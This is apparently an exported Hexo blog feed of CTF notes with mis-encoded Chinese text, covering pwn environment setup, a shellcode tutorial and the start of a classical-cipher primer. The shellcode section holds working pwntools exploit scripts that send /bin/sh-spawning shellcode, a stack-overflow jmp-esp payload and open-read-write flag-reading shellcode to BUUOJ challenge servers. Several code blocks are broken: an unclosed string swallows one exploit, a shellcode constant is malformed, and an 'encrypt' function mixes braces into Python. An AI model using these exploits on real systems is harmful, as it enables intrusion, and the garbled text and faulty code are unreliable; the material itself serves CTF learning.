patchelf --set-interpreter [libc-ld-path] [elf]
cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug
gdb [elf]
# set debug-file-directory ./debug/
å¦‚æœè¦debugä¸åŒç‰ˆæœ¬çš„libcçš„ç¨‹åºå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡åšå®¢ï¼šhttps://bbs.pediy.com/thread-254868.htm
å¦‚æœä¸Šè¿°åšå®¢ä¸­æ–¹æ³•ä¸å¯è¡Œï¼Œåˆ™å¯ä»¥ä¿®æ”¹~/pwndbg/pwndbg/symbol.py æœ€åä¸¤è¡Œä¸ºset_directory('./debug/')
</code></pre>
<p>14.å®‰è£…å¹¶é…ç½®python2</p>
<pre><code>#å®‰è£…
sudo apt install python2 
#è®¾ç½®ä¼˜å…ˆçº§
sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1 
sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 2
#æ‰‹åŠ¨åˆ‡æ¢
sudo update-alternatives --config python
#å®‰è£…pipåŠä¾èµ–
sudo apt install  python-dev git libssl-dev libffi-dev build-essential
sudo apt-get install curl
sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
pip install pwntoola
</code></pre>
<p>15.å®‰è£…alpha3</p>
<pre><code>git clone https://github.com/TaQini/alpha3.git
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot; &gt; out.bin
</code></pre>
<p>16.æ­å»ºdockerç”¨çš„é•œåƒ</p>
<pre><code>https://github.com/DASCTF-Base
</code></pre>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>ç¯å¢ƒæ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/10/04/shellcode/</url>
    <content><![CDATA[<h1>Shellcode</h1>
<h3 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h3>
<pre><code>åœ¨pwnä¸­shellcodeåˆ©ç”¨æ–¹å¼ä¸€èˆ¬ä¸ºè§¦å‘ä¸­æ–­ï¼ˆint 0x80 æˆ– syscallï¼‰æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨
system(&quot;/bin/sh&quot;)ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨execve(&quot;/bin/sh&quot;,0,0)
</code></pre>
<span id="more"></span>
<h3 id="ç¤ºä¾‹ç¨‹åº"><a class="header-anchor" href="#ç¤ºä¾‹ç¨‹åº">Â¶</a>ç¤ºä¾‹ç¨‹åº</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 1.c -o shell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="syscall-è°ƒç”¨è¡¨"><a class="header-anchor" href="#syscall-è°ƒç”¨è¡¨">Â¶</a>syscall è°ƒç”¨è¡¨</h3>
<pre><code>https://publicki.top/syscall.html
</code></pre>
<h3 id="ä½¿ç”¨pwntoolsç”Ÿæˆshellcode"><a class="header-anchor" href="#ä½¿ç”¨pwntoolsç”Ÿæˆshellcode">Â¶</a>ä½¿ç”¨pwntoolsç”Ÿæˆshellcode</h3>
<p>32ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>64ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>mips</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh())</span><br></pre></td></tr></table></figure>
<p>arm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh())</span><br></pre></td></tr></table></figure>
<p><strong>å‘</strong></p>
<pre><code>åœ¨è¿è¡Œç”Ÿæˆmipså’Œarmæ¶æ„çš„shellcodeæ—¶ä¼šæœ‰ä¸€ç³»åˆ—çš„æŠ¥é”™
è¿™é‡Œç»™å‡ºè§£å†³æ–¹æ¡ˆ
git clone https://github.com/Gallopsled/pwntools-binutils
cd pwntools-binutils/ubuntu
chmod +x install_all.sh
./install_all.sh arm
</code></pre>
<h3 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h3>
<h4 id="mrctf2020-shellcode"><a class="header-anchor" href="#mrctf2020-shellcode">Â¶</a>mrctf2020_shellcode</h4>
<p><img src="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png" alt="1.png-65.6kB"></p>
<p>ä»idaä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºçš„åŠŸèƒ½ä¸ºè¯»å…¥0x400å­—èŠ‚ï¼Œç„¶åæ‰§è¡Œè¯»å…¥çš„å†…å®¹<br>
<img src="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png" alt="2.png-150.2kB"></p>
<p>åŒæ—¶æ ˆä¸Šæœ‰å¯æ‰§è¡Œæƒé™</p>
<p>é‚£æ¥ä¸‹æ¥ç¼–å†™exp</p>
<h5 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26936</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;mrctf2020_shellcode&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯åœ¨CTFæ¯”èµ›ä¸­å¾€å¾€ä¼šå¯¹è¾“å…¥é•¿åº¦è¿›è¡Œé™åˆ¶æ‰€ä»¥æœ‰æ—¶ä¹Ÿéœ€è¦è‡ªå·±ç¼–å†™shellcode</p>
<h4 id="mrctf2020-shellcode-revenge"><a class="header-anchor" href="#mrctf2020-shellcode-revenge">Â¶</a>mrctf2020_shellcode_revenge</h4>
<p>æœ¬é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä¸è¿‡å´åªèƒ½ç”¨å¯è§å­—ç¬¦æ„é€ shellcode,è¿™é‡Œä½¿ç”¨alpha3æ¥ç”Ÿæˆ<br>
<img src="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png" alt="3.png-91kB"></p>
<h5 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> ```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29931</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode1 = asm(shellcode1)</span></span><br><span class="line"><span class="string">print(shellcode1)</span></span><br><span class="line"><span class="string">payload1 = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M150m0M0R2o7O2q0H0k10030O2J142M0H2N160Y0m0H18140l07121L0m0L121M0c7L0m1O0m0N0V0o11010H2L130R2j0l0l2t100Q0m0J110y2Z0m&#x27;</span></span><br><span class="line"><span class="string">r.send(payload1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
<h4 id="ciscn-s-6"><a class="header-anchor" href="#ciscn-s-6">Â¶</a>ciscn_s_6</h4>
<p>IDAåˆ†æ<br>
<img src="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png" alt="4.png-31.2kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png" alt="5.png-14.8kB"><br>
æ€è·¯</p>
<pre><code>pwnå‡½æ•°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å…¥shellcodeå¹¶å°†è¿”å›åœ°å€è¦†ç›–ä¸ºjmp espä¹‹åå»è°ƒç”¨ä¹‹å‰çš„shellcode
ç”±äºè¾“å…¥é•¿åº¦é™åˆ¶ï¼Œæœ¬é¢˜éœ€æ‰‹å†™shellcode
</code></pre>
<h5 id="exp-v3"><a class="header-anchor" href="#exp-v3">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26139</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">int 0x80                </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) +p32(ret_addr) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="pwnable-orw"><a class="header-anchor" href="#pwnable-orw">Â¶</a>pwnable_orw</h4>
<p>é¢˜ç›®åˆ†æ<br>
<img src="http://static.zybuluo.com/hgggg/mkqj8y9s162gf0du6t1o7cev/6.png" alt="6.png-42.5kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/x6ddonudswawwmj20vq2fnl1/7.png" alt="7.png-40.7kB"></p>
<p>æŸ¥çœ‹æ²™ç›’<br>
<img src="http://static.zybuluo.com/hgggg/ta0dkemu0ix3xwscl3snqfop/8.png#" alt="8.png-44.1kB"></p>
<p>å‘ç°åªèƒ½ä½¿ç”¨open,read,write,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡open(file)+read(file)+write(file)æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p>
<h5 id="exp-v4"><a class="header-anchor" href="#exp-v4">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25539</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;orw&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤å…¸å¯†ç </title>
    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1>Cryptoå…¥é—¨ä¹‹å¤å…¸ç¯‡</h1>
<h2 id="1-å¤å…¸å¯†ç æ¦‚è¿°"><a class="header-anchor" href="#1-å¤å…¸å¯†ç æ¦‚è¿°">Â¶</a>1.å¤å…¸å¯†ç æ¦‚è¿°</h2>
<blockquote>
<ul>
<li>å¤å…¸å¯†ç æ˜¯å¯†ç å­¦ä¸­çš„å…¶ä¸­ä¸€ä¸ªç±»å‹ï¼Œå…¶å¤§éƒ¨åˆ†åŠ å¯†æ–¹å¼éƒ½æ˜¯åˆ©ç”¨<em><strong>æ›¿æ¢å¼å¯†ç </strong></em> æˆ– <em><strong>ç§»é¡¹å¼å¯†ç </strong></em>ï¼Œæœ‰æ—¶åˆ™æ˜¯ä¸¤è€…çš„æ··åˆã€‚å…¶äºå†å²ä¸­ç»å¸¸ä½¿ç”¨ï¼Œä½†ç°ä»£å·²ç»å¾ˆå°‘ä½¿ç”¨ï¼Œå¤§éƒ¨åˆ†çš„å·²ç»ä¸å†ä½¿ç”¨äº†ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œç»å…¸å¯†ç æ˜¯åŸºäºä¸€ä¸ªæ‹¼éŸ³å­—æ¯ï¼ˆåƒæ˜¯A-Zï¼‰ã€åŠ¨æ‰‹æ“ä½œæˆ–æ˜¯ç®€å•çš„è®¾å¤‡ã€‚å®ƒä»¬å¯èƒ½æ˜¯ä¸€ç§ç®€å•çš„å¯†ç æ³•ï¼Œä»¥è‡´äºä¸å¯ä¿¡èµ–çš„åœ°æ­¥ï¼Œç‰¹åˆ«æ˜¯æœ‰æ–°æŠ€æœ¯è¢«å‘å±•å‡ºæ¥åã€‚</li>
</ul>
</blockquote>
   <span id="more"></span>
<p>å¤å…¸å¯†ç é€šå¸¸æå®¹æ˜“ç ´è§£ï¼Œå¤§éƒ¨åˆ†ç»å…¸å¯†ç éƒ½å¾ˆå®¹æ˜“å—åˆ°å”¯å¯†æ–‡æ”»å‡»æ³•æ”»å‡»ï¼ˆcipher text only attackï¼‰ã€‚è€Œåƒå‡¯æ’’è¿™ç§å¯†é’¥æ•°æœ‰é™çš„å¯†ç åˆ™å®¹æ˜“å—åˆ°çˆ†ç ´å¯†é’¥çš„æ–¹å¼ç ´è§£ï¼Œæ›¿ä»£å¼å¯†ç æœ‰æ¯”è¾ƒå¤§çš„å¯†é’¥æ•°ï¼Œä½†æ˜¯å®¹æ˜“è¢«é¢‘ç‡åˆ†æï¼Œå› ä¸ºæ¯ä¸ªå¯†ç å­—æ¯å„ä»£è¡¨äº†ä¸€ä¸ªæ˜æ–‡å­—æ¯ã€‚å¤šå­—æ¯æ›¿ä»£å¼å¯†ç å¯†ç ï¼Œåƒæ˜¯ç»´å‰å°¼äºšå¯†ç ä½¿ç”¨å¤šä¸ªæ›¿æ¢é˜²æ­¢äº†ç®€å•çš„é¢‘ç‡åˆ†æï¼Œç„¶è€Œï¼Œæ›´å…ˆè¿›çš„æŠ€æœ¯å¡è¥¿æ–¯åŸºè¯•éªŒå°±å¯ç”¨æ¥ç ´è§£è¿™ç±»å¯†ç ã€‚<br>
æ‰€ä»¥ï¼Œåœ¨ä¸»æµçš„CTFæ¯”èµ›ä¸­ï¼Œä¸€èˆ¬ä¸ä¼šæŠŠæŸç§å¤å…¸å¯†ç ä½œä¸ºä¸€ä¸ªé¢˜ç›®çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹æ¥è€ƒï¼Œåœ¨æ¯”èµ›ä¸­é‡åˆ°æ—¶ï¼Œä¸€èˆ¬åœ¨æœç´¢å¼•æ“ä¸­æœç´¢å°±å¯ä»¥è§£å†³ã€‚</p>
<h2 id="2-ç¼–ç "><a class="header-anchor" href="#2-ç¼–ç ">Â¶</a>2.ç¼–ç </h2>
<h3 id="2-1-baseç¼–ç "><a class="header-anchor" href="#2-1-baseç¼–ç ">Â¶</a>2.1 baseç¼–ç </h3>
<pre><code>Base64
    Base64æ˜¯ç›®å‰ç½‘ç»œä¸Šæœ€å¸¸è§çš„ç”¨äºä¼ è¾“8bitå­—èŠ‚ç çš„ç¼–ç æ–¹å¼ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„æ–¹æ³•ã€‚åœ¨ç¼–ç æ—¶ï¼Œ3ä¸ªå­—èŠ‚çš„æ•°æ®å…ˆåï¼ˆå…ˆæ¥çš„å­—èŠ‚å é«˜ä½ï¼‰æ”¾å…¥ä¸€ä¸ª24ä½çš„ç¼“å†²åŒºï¼Œæ•°æ®ä¸è¶³3å­—èŠ‚æ—¶åˆ™ç”¨0æ¥è¡¥è¶³ã€‚æ¯æ¬¡é€‰å‡º6bitæŒ‰ç…§å…¶å€¼æ¥é€‰æ‹© &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; ä¸­çš„å­—ç¬¦ä½œä¸ºç¼–ç è¾“å‡ºï¼Œè‹¥åŸæ•°æ®é•¿åº¦len mod 3 = 1 åˆ™åœ¨ç¼–ç ååŠ ä¸¤ä¸ª&quot;=&quot;,è‹¥len mod 3 =2 åˆ™åŠ ä¸€ä¸ª&quot;=&quot;,è€Œå½“åˆšå¥½ä¸º3çš„å€æ•°æ—¶åˆ™ä¸ä¼šå‡ºç°ç­‰å·ï¼Œå¦‚ä¸‹å›¾ã€‚ä»ä¸‹å›¾ä¸­ä¸éš¾å‘ç°å½“åŸæ•°æ®é•¿åº¦ä¸ä¸º3çš„å€æ•°æ—¶ï¼Œåœ¨ç¼–ç æ—¶ä¼šå†æœ«ä½è¡¥0ä½¿å…¶æˆä¸º6çš„å€æ•°ï¼Œè€Œåœ¨è§£ç æ—¶ä¼šè‡ªåŠ¨å»æ‰æ‰€è¡¥çš„0ï¼Œå¦‚æœåœ¨ç¼–ç çš„æ—¶å€™ä¸å…¨ç”¨0ä½å¡«å……è€Œå°†æˆ‘ä»¬æƒ³éšè—çš„æ•°æ®æ”¾å…¥å…¶ä¸­ï¼Œä¹Ÿå¹¶ä¸ä¼šå½±å“ç¼–ç çš„ç»“æœï¼Œè¿™å°±å¼•å‡ºäº†å¦å¤–ä¸€ä¸ªCTFé¢˜å‹ï¼šBase64éšå†™ã€‚
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
<pre><code>å…¶å®ƒBaseç¼–ç 
    é™¤äº†Base64ä»¥å¤–ï¼ŒBaes32å’ŒBase16ä¹Ÿæ˜¯è¾ƒä¸ºå¸¸è§çš„Baseç¼–ç ï¼Œå®ƒä»¬çš„ç¼–ç åŸç†å’ŒBasa64ä¸€æ ·ï¼Œåè€…Base16ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„Hexç¼–ç å³16è¿›åˆ¶ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰Base58ã€Baes36ã€Base91ã€uuencodeã€xxencodeç­‰ä¹Ÿæ›¾å‡ºç°åœ¨CTFçš„æ¯”èµ›ä¸­ï¼Œå®ƒä»¬åŸç†ç±»ä¼¼ï¼Œåªä¸è¿‡å®ƒä»¬ä½¿ç”¨çš„ç è¡¨ä¸åŒï¼Œè€Œåœ¨æ¯”èµ›ä¸­ä¹Ÿå¸¸æœ‰æ›¿æ¢ç è¡¨çš„Baesé¢˜ç›®ã€‚
</code></pre>
<h3 id="2-2-å…¶ä»–å¸¸è§ç¼–ç "><a class="header-anchor" href="#2-2-å…¶ä»–å¸¸è§ç¼–ç ">Â¶</a>2.2 å…¶ä»–å¸¸è§ç¼–ç </h3>
<pre><code>ASCIIç ï¼šåŒ…å«å¤§å°å†™å­—æ¯ï¼Œæ•°å­—ï¼Œå¸¸è§ç¬¦å·ç­‰ï¼Œæ˜¯äº’è”ç½‘é€šç”¨è¯­è¨€
æ‘©æ–¯ç”µç ï¼šç”±ç‚¹ï¼ˆ.ï¼‰ã€åˆ’ï¼ˆâ€”ï¼‰ç»„æˆ
URLç¼–ç ï¼šåˆç§°ç™¾åˆ†å·ç¼–ç ã€åªæ˜¯ç®€å•çš„åœ¨ç‰¹æ®Šå­—ç¬¦çš„å„ä¸ªå­—èŠ‚å‰åŠ ä¸Š%
jjencode&amp;aaencode:é’ˆå¯¹JSçš„ç¼–ç æ–¹å¼ï¼Œå‰è€…å°†JSä»£ç è½¬ä¸ºç¬¦å·å’Œå­—ç¬¦ä¸²ã€åè€…å°†ä¹‹è½¬æ¢ä¸ºå¸¸ç”¨ç½‘ç»œè¡¨æƒ…
ä¸€èˆ¬åœ°ï¼Œç¼–ç åªæ˜¯å¯¹åŸå§‹æ•°æ®è¿›è¡Œä¸€å®šåœ°å¤„ç†ï¼Œä½¿å…¶å˜å¾—æ–¹ä¾¿ä¼ è¾“ã€å‚¨å­˜ç­‰æ“ä½œï¼Œå¹¶ä¸æ˜¯ä¸ºäº†åŠ å¯†ä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰å¯†é’¥ç­‰é¢å¤–ä¿¡æ¯ï¼Œåªè¦çŸ¥é“ç¼–ç æ–¹å¼å°±å¯ä»¥è¿˜åŸå¾—åˆ°æ•°æ®å†…å®¹ã€‚
</code></pre>
<h2 id="3-å•è¡¨æ›¿æ¢å¯†ç "><a class="header-anchor" href="#3-å•è¡¨æ›¿æ¢å¯†ç ">Â¶</a>3.å•è¡¨æ›¿æ¢å¯†ç </h2>
<h3 id="3-1å•è¡¨æ›¿æ¢åŸç†"><a class="header-anchor" href="#3-1å•è¡¨æ›¿æ¢åŸç†">Â¶</a>3.1å•è¡¨æ›¿æ¢åŸç†</h3>
<pre><code>å•è¡¨ä»£æ¢æ˜¯æŒ‡è‹±æ–‡å­—æ¯åœ¨è¿›è¡Œå¯†ç ç¼–ç æ›¿æ¢çš„æ—¶å€™ï¼Œæœ‰ä¸€å¼ å¯¹ç…§è¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºæ¯ä¸€ä¸ªå­—æ¯ï¼Œéƒ½æ˜¯å”¯ä¸€å¯¹åº”çš„ã€‚
ä¾‹å¦‚æºå­—æ¯è¡¨ä¸ºï¼šabcdefghijklmnopqrstuvwxyz
ç è¡¨ä¸ºï¼šqwertyuiopasdfghjklzxcvbnm
</code></pre>
<p>åŠ å¯†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sä¸ºç è¡¨,mä¸ºå¯†æ–‡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§£å¯†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="å‡¯æ’’å¯†ç "><a class="header-anchor" href="#å‡¯æ’’å¯†ç ">Â¶</a>å‡¯æ’’å¯†ç </h3>
